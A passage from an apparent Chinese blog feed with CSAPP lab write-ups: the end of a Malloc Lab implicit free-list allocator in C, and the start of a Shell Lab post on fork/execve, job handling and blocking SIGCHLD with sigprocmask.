punctuation">(</span>size <span class="token operator">+</span> <span class="token punctuation">(</span>DSIZE<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span>DSIZE <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">/</span> DSIZE<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    osize <span class="token operator">=</span> <span class="token function">GET_SIZE</span><span class="token punctuation">(</span><span class="token function">HDRP</span><span class="token punctuation">(</span>ptr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>osize <span class="token operator">==</span> asize<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token comment">// 不变</span>        bp <span class="token operator">=</span> ptr<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>osize <span class="token operator">></span> asize<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token comment">// 收缩，进行分割</span>        <span class="token function">place</span><span class="token punctuation">(</span>ptr<span class="token punctuation">,</span> asize<span class="token punctuation">)</span><span class="token punctuation">;</span>        bp <span class="token operator">=</span> ptr<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                     <span class="token comment">// 扩张，首先尝试合并相邻块，若相邻块已分配或合并后仍然不够，</span>                                 <span class="token comment">// 则尝试查找新块，若找不到，则进行堆空间的申请</span>        <span class="token comment">// 合并相邻块（简化版：只合并后续块）</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">GET_ALLOC</span><span class="token punctuation">(</span><span class="token function">HDRP</span><span class="token punctuation">(</span><span class="token function">NEXT_BLKP</span><span class="token punctuation">(</span>ptr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            osize <span class="token operator">+=</span> <span class="token function">GET_SIZE</span><span class="token punctuation">(</span><span class="token function">HDRP</span><span class="token punctuation">(</span><span class="token function">NEXT_BLKP</span><span class="token punctuation">(</span>ptr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">PUT</span><span class="token punctuation">(</span><span class="token function">HDRP</span><span class="token punctuation">(</span>ptr<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">PACK</span><span class="token punctuation">(</span>osize<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">PUT</span><span class="token punctuation">(</span><span class="token function">FTRP</span><span class="token punctuation">(</span>ptr<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">PACK</span><span class="token punctuation">(</span>osize<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>osize <span class="token operator">>=</span> asize<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                         <span class="token comment">// 合并后足够分配</span>            <span class="token function">place</span><span class="token punctuation">(</span>ptr<span class="token punctuation">,</span> asize<span class="token punctuation">)</span><span class="token punctuation">;</span>            bp <span class="token operator">=</span> ptr<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>bp <span class="token operator">=</span> <span class="token function">find_fit</span><span class="token punctuation">(</span>asize<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token comment">// 合并后仍然不够，查找新块</span>            <span class="token function">place</span><span class="token punctuation">(</span>bp<span class="token punctuation">,</span> asize<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">memcpy</span><span class="token punctuation">(</span>bp<span class="token punctuation">,</span> ptr<span class="token punctuation">,</span> <span class="token function">MIN</span><span class="token punctuation">(</span>osize<span class="token punctuation">,</span> asize<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">mm_free</span><span class="token punctuation">(</span>ptr<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                                      <span class="token comment">// 未匹配任何块，申请更多内存</span>            extendsize <span class="token operator">=</span> <span class="token function">MAX</span><span class="token punctuation">(</span>asize<span class="token punctuation">,</span> CHUNKSIZE<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>bp <span class="token operator">=</span> <span class="token function">extend_heap</span><span class="token punctuation">(</span>extendsize <span class="token operator">/</span> WSIZE<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token function">place</span><span class="token punctuation">(</span>bp<span class="token punctuation">,</span> asize<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token function">memcpy</span><span class="token punctuation">(</span>bp<span class="token punctuation">,</span> ptr<span class="token punctuation">,</span> <span class="token function">MIN</span><span class="token punctuation">(</span>osize<span class="token punctuation">,</span> asize<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token function">mm_free</span><span class="token punctuation">(</span>ptr<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> bp<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token operator">*</span><span class="token function">extend_heap</span><span class="token punctuation">(</span><span class="token class-name">size_t</span> words<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>bp<span class="token punctuation">;</span>    <span class="token class-name">size_t</span> size<span class="token punctuation">;</span>    <span class="token comment">// 分配偶数个字来保持字节对齐 </span>    size <span class="token operator">=</span> <span class="token punctuation">(</span>words <span class="token operator">%</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token punctuation">(</span>words <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> WSIZE <span class="token operator">:</span> words <span class="token operator">*</span> WSIZE<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">long</span><span class="token punctuation">)</span><span class="token punctuation">(</span>bp <span class="token operator">=</span> <span class="token function">mem_sbrk</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// 初始化空闲块的 header, footer 和下一块的 epilogue</span>    <span class="token function">PUT</span><span class="token punctuation">(</span><span class="token function">HDRP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">PACK</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">PUT</span><span class="token punctuation">(</span><span class="token function">FTRP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">PACK</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">PUT</span><span class="token punctuation">(</span><span class="token function">HDRP</span><span class="token punctuation">(</span><span class="token function">NEXT_BLKP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">PACK</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// 如果前一块是空闲，则合并</span>    <span class="token keyword">return</span> <span class="token function">coalesce</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token operator">*</span><span class="token function">coalesce</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span>bp<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token class-name">size_t</span> prev_alloc <span class="token operator">=</span> <span class="token function">GET_ALLOC</span><span class="token punctuation">(</span><span class="token function">FTRP</span><span class="token punctuation">(</span><span class="token function">PREV_BLKP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">size_t</span> next_alloc <span class="token operator">=</span> <span class="token function">GET_ALLOC</span><span class="token punctuation">(</span><span class="token function">HDRP</span><span class="token punctuation">(</span><span class="token function">NEXT_BLKP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">size_t</span> size <span class="token operator">=</span> <span class="token function">GET_SIZE</span><span class="token punctuation">(</span><span class="token function">HDRP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>prev_alloc <span class="token operator">&amp;&amp;</span> next_alloc<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token comment">// 前后都已分配</span>        <span class="token keyword">return</span> bp<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>prev_alloc <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>next_alloc<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token comment">// 后一块未分配</span>        size <span class="token operator">+=</span> <span class="token function">GET_SIZE</span><span class="token punctuation">(</span><span class="token function">HDRP</span><span class="token punctuation">(</span><span class="token function">NEXT_BLKP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">PUT</span><span class="token punctuation">(</span><span class="token function">HDRP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">PACK</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">PUT</span><span class="token punctuation">(</span><span class="token function">FTRP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">PACK</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>prev_alloc <span class="token operator">&amp;&amp;</span> next_alloc<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token comment">// 前一块未分配</span>        size <span class="token operator">+=</span> <span class="token function">GET_SIZE</span><span class="token punctuation">(</span><span class="token function">HDRP</span><span class="token punctuation">(</span><span class="token function">PREV_BLKP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">PUT</span><span class="token punctuation">(</span><span class="token function">FTRP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">PACK</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">PUT</span><span class="token punctuation">(</span><span class="token function">HDRP</span><span class="token punctuation">(</span><span class="token function">PREV_BLKP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">PACK</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        bp <span class="token operator">=</span> <span class="token function">PREV_BLKP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                                 <span class="token comment">// 前后都未分配 </span>        size <span class="token operator">+=</span> <span class="token function">GET_SIZE</span><span class="token punctuation">(</span><span class="token function">HDRP</span><span class="token punctuation">(</span><span class="token function">PREV_BLKP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token function">GET_SIZE</span><span class="token punctuation">(</span><span class="token function">FTRP</span><span class="token punctuation">(</span><span class="token function">NEXT_BLKP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">PUT</span><span class="token punctuation">(</span><span class="token function">HDRP</span><span class="token punctuation">(</span><span class="token function">PREV_BLKP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">PACK</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">PUT</span><span class="token punctuation">(</span><span class="token function">FTRP</span><span class="token punctuation">(</span><span class="token function">NEXT_BLKP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">PACK</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        bp <span class="token operator">=</span> <span class="token function">PREV_BLKP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> bp<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token operator">*</span><span class="token function">find_fit</span><span class="token punctuation">(</span><span class="token class-name">size_t</span> asize<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token class-name">size_t</span> size<span class="token punctuation">;</span>    <span class="token comment">// 最简单的首次匹配策略</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span>blkp <span class="token operator">=</span> heap_listp<span class="token punctuation">;</span>        <span class="token punctuation">(</span>size <span class="token operator">=</span> <span class="token function">GET_SIZE</span><span class="token punctuation">(</span><span class="token function">HDRP</span><span class="token punctuation">(</span>blkp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">;</span>        blkp <span class="token operator">=</span> <span class="token function">NEXT_BLKP</span><span class="token punctuation">(</span>blkp<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>size <span class="token operator">>=</span> asize <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token function">GET_ALLOC</span><span class="token punctuation">(</span><span class="token function">HDRP</span><span class="token punctuation">(</span>blkp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> blkp<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token constant">NULL</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">place</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span>bp<span class="token punctuation">,</span> <span class="token class-name">size_t</span> asize<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token class-name">size_t</span> size <span class="token operator">=</span> <span class="token function">GET_SIZE</span><span class="token punctuation">(</span><span class="token function">HDRP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// 空闲块大小</span>    <span class="token class-name">size_t</span> remain <span class="token operator">=</span> size <span class="token operator">-</span> asize<span class="token punctuation">;</span>      <span class="token comment">// 空闲块分配 asize 字节后剩余的空间</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>remain <span class="token operator">>=</span> DSIZE<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token comment">// 分割</span>        <span class="token function">PUT</span><span class="token punctuation">(</span><span class="token function">HDRP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">PACK</span><span class="token punctuation">(</span>asize<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">PUT</span><span class="token punctuation">(</span><span class="token function">FTRP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">PACK</span><span class="token punctuation">(</span>asize<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        bp <span class="token operator">=</span> <span class="token function">NEXT_BLKP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">PUT</span><span class="token punctuation">(</span><span class="token function">HDRP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">PACK</span><span class="token punctuation">(</span>remain<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">PUT</span><span class="token punctuation">(</span><span class="token function">FTRP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">PACK</span><span class="token punctuation">(</span>remain<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                <span class="token comment">// 不分割</span>        <span class="token function">PUT</span><span class="token punctuation">(</span><span class="token function">HDRP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">PACK</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">PUT</span><span class="token punctuation">(</span><span class="token function">FTRP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">PACK</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre>]]></content>
    
    
    <summary type="html">&lt;p&gt;本 Lab 需要实现一个内存分配器，技巧性较强，对应知识点为书中的第 9 章的第 9.9 节。个人认为是所有 Lab 中难度最高的一个，我这里也是时间所迫，只参照教材实现了隐式空闲链表，显式空闲链表的实现尚存在一些 bug，在本文暂不介绍。&lt;/p&gt;</summary>
    
    
    
    <category term="计算机基础" scheme="http://lordaeronesz.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/"/>
    
    
    <category term="经验" scheme="http://lordaeronesz.github.io/tags/%E7%BB%8F%E9%AA%8C/"/>
    
    <category term="计算机基础" scheme="http://lordaeronesz.github.io/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/"/>
    
    <category term="C" scheme="http://lordaeronesz.github.io/tags/C/"/>
    
  </entry>
  
  <entry>
    <title>CSAPP Shell Lab</title>
    <link href="http://lordaeronesz.github.io/2024/12/29/CSAPP-Shell-Lab/"/>
    <id>http://lordaeronesz.github.io/2024/12/29/CSAPP-Shell-Lab/</id>
    <published>2024-12-29T03:45:11.000Z</published>
    <updated>2024-12-30T07:17:26.094Z</updated>
    
    <content type="html"><![CDATA[<p>本 Lab 需要实现一个简易的 shell，主要考察对进程和信号的理解，以及对与其相关的 POSIX API 的使用，对应知识点为书中的第 8 章内容。</p><span id="more"></span><h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><h2 id="实验要求"><a href="#实验要求" class="headerlink" title="实验要求"></a>实验要求</h2><p>实现一个简单的 shell，要求支持如下特性：</p><ol><li>输入 ctrl-c 触发 SIGINT 信号，输入 ctrl-z 触发 SIGTSTP 信号，发送给给前台运行的任务和依赖于这些任务的子任务（子进程）。</li><li>如果命令行以 <code>&amp;</code> 结尾，那么本次作业将被置于后台运行，否则置于前台运行。</li><li>每个作业可以通过 PID（process id）或 JID（job id）来指定，其中 JID 需要加上前缀 <code>%</code>。</li><li>支持下列内建命令：<ol><li><code>quit</code>：终止 shell 的运行。</li><li><code>jobs</code>：列出所有的后台作业。</li><li><code>bg &lt;job&gt;</code>：重启 <code>&lt;job&gt;</code>（PID 或者 JID），通过发出 SIGCONT 信号，然后将其运行在后台。</li><li><code>fg &lt;job&gt;</code>：重启 <code>&lt;job&gt;</code>（PID 或者 JID），通过发出 SIGCONT 信号，然后将其运行在前台。</li></ol></li><li>回收所有的僵尸进程。</li></ol><h2 id="命令行解释执行"><a href="#命令行解释执行" class="headerlink" title="命令行解释执行"></a>命令行解释执行</h2><p><code>eval</code> 函数的作用是解析并执行 shell 输入的命令行。对于内建命令（builtin command）而言，应该立即在 shell 中进行处理；而对于非内建命令而言，应该使用 <code>fork + execve</code> 的组合，创建一个指定的进程来进行处理。</p><blockquote><p>tsh 不需要支持管道功能，因此一个作业只对应一个进程。</p></blockquote><p><code>fork</code> 的功能是创建一个子进程，该子进程的虚拟地址空间完全拷贝自其父进程，且程序计数器的位置同样位于该 <code>fork</code> 函数处。区别在于，父进程的返回值为子进程的 pid，子进程的 pid 为 0，因此可以根据这一特性来对父进程和子进程进行分别处理：</p><ul><li>子进程需要先使用 <code>setpgid(0, 0)</code> 将进程组 id 设置为自己的 pid，将自己与 tsh “脱离”，确保此时前台进程组只有 tsh 本身，防止被 tsh 接收到的信号所影响。然后再使用 <code>execve</code>，用指定的可执行程序替换拷贝自父进程的虚拟地址空间，并开始从头执行。</li><li>父进程则需要根据本次输入的命令行，创建其对应的作业数据结构 <code>struct job_t</code>，并加入作业队列 <code>jobs</code> 中。同时，由于前台作业（命令行末尾不带 <code>&amp;</code> 符号）需要一直占用终端，因此当本次作业为前台作业时，需要调用 <code>waitfg</code> 进行等待，直到作业的类型不再是前台运行（<code>FG</code>）。</li></ul><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>pid <span class="token operator">=</span> <span class="token function">fork</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">setpgid</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// 将进程组设置为自己的 pid</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">execve</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> argv<span class="token punctuation">,</span> environ<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"execve %s error\n"</span><span class="token punctuation">,</span> argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>bg<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">addjob</span><span class="token punctuation">(</span>jobs<span class="token punctuation">,</span> pid<span class="token punctuation">,</span> BG<span class="token punctuation">,</span> cmdline<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[%d] (%d) %s"</span><span class="token punctuation">,</span> <span class="token function">getjobpid</span><span class="token punctuation">(</span>jobs<span class="token punctuation">,</span> pid<span class="token punctuation">)</span><span class="token operator">-></span>jid<span class="token punctuation">,</span> pid<span class="token punctuation">,</span> cmdline<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token function">addjob</span><span class="token punctuation">(</span>jobs<span class="token punctuation">,</span> pid<span class="token punctuation">,</span> FG<span class="token punctuation">,</span> cmdline<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">waitfg</span><span class="token punctuation">(</span>pid<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>根据书中 8.5.6 节的描述，可能会出现一种情况：父进程 <code>fork</code> 子进程后，子进程一直被调度执行，直到运行结束称为一个僵尸进程（zombie）并向父进程发送 SIGCHLD 信号。等到父进程被调度时，他先响应 SIGCHLD 信号并将成为僵尸进程的子进程收割（reap），同时尝试将作业从作业队列中移除，此时事实上不会做任何事情，因为作业还没有加入到作业队列中。再接下来父进程继续执行 <code>fork</code> 后的代码，才将作业加入到作业队列中，这明显不对！</p><p>针对这类恼人的同步问题，可以采用 <code>sigprocmask</code> （如下所示是 <code>sigprocmask</code> 的使用说明）在适当的位置设置信号屏蔽字来解决。对于本问题，可以在父进程中先屏蔽对 SIGCHLD 信号的处理，等到使用 <code>addjob</code> 将作业加入作业队列后才开始响应 SIGCHLD 信号，这样即便是子进程先执行完毕并向父进程发送 SIGCHLD 信号，父进程也能确保在 <code>addjob</code> 执行完后才处理这一信号。</p><blockquote><ul><li>generated by GPT4o</li></ul><h3 id="sigprocmask-介绍"><a href="#sigprocmask-介绍" class="headerlink" title="sigprocmask 介绍"></a><strong><code>sigprocmask</code> 介绍</strong></h3><p><code>sigprocmask</code> 是一个用于操作信号屏蔽字（signal mask）的系统调用。它允许程序暂时屏蔽或取消屏蔽某些信号的接收，进而控制信号的处理行为。通过它，程序可以避免在特定代码段中处理中断信号，从而进行更细粒度的控制。</p><h4 id="sigprocmask-的原型："><a href="#sigprocmask-的原型：" class="headerlink" title="sigprocmask 的原型："></a><strong><code>sigprocmask</code> 的原型：</strong></h4><pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;signal.h></span></span><span class="token keyword">int</span> <span class="token function">sigprocmask</span><span class="token punctuation">(</span><span class="token keyword">int</span> how<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token class-name">sigset_t</span> <span class="token operator">*</span>set<span class="token punctuation">,</span> <span class="token class-name">sigset_t</span> <span class="token operator">*</span>oldset<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><ul><li><strong><code>how</code></strong>：<ul><li><code>SIG_BLOCK</code>：将 <code>set</code> 中的信号加入到当前信号屏蔽字中（即阻塞这些信号）。</li><li><code>SIG_UNBLOCK</code>：从当前信号屏蔽字中移除 <code>set</code> 中的信号（即解除屏蔽这些信号）。</li><li><code>SIG_SETMASK</code>：将当前信号屏蔽字设置为 <code>set</code> 中的信号集（即完全替换当前的信号屏蔽字）。</li></ul></li><li><strong><code>set</code></strong>：指向包含信号集的 <code>sigset_t</code> 类型变量，该变量指定要阻塞或解除阻塞的信号。</li><li><strong><code>oldset</code></strong>：指向 <code>sigset_t</code> 类型的变量，用来保存当前的信号屏蔽字，以便稍后恢复。</li></ul><h4 id="信号集-sigset-t-的操作："><a href="#信号集-sigset-t-的操作：" class="headerlink" title="信号集 sigset_t 的操作："></a><strong>信号集 <code>sigset_t</code> 的操作：</strong></h4><ul><li>初始化信号集：<ul><li><code>sigemptyset(sigset_t *set)</code>：清空信号集。</li><li><code>sigfillset(sigset_t *set)</code>：将所有信号加入信号集。</li><li><code>sigaddset(sigset_t *set, int signum)</code>：将特定信号加入信号集。</li><li><code>sigdelset(sigset_t *set, int signum)</code>：从信号集中移除特定信号。</li></ul></li></ul></blockquote><p>此外，为了防止其他可能的并发错误出现，可以在对全局变量的修改前先屏蔽所有信号。</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token 